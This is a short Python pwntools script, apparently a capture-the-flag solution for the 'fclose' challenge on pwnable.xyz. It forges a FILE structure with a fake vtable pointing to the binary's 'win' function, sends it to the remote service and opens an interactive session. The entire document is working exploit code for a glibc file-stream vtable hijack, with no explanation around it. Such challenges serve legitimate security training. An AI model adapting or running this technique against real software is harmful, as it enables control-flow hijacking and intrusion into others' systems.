from pwn import *
#p = process("./fclose")
elf = ELF("./fclose")
p = remote("svc.pwnable.xyz", 30018)
pause()
vtable = 0x601340
payload = p64(0xfbad2088)
payload += p64(0x0) * 14
payload += p64(0xffffffffffffffff)
payload += p64(0x0)
payload += p64(0x601268)
payload += p64(0xffffffffffffffff)
payload += p64(0x0)
payload += p64(0x601268)
payload += p64(0x0) * 6
payload += p64(vtable)
_IO_jump_t = p64(0x0) * 17 + p64(elf.symbols['win'])
payload += _IO_jump_t
p.send(payload)

p.interactive()
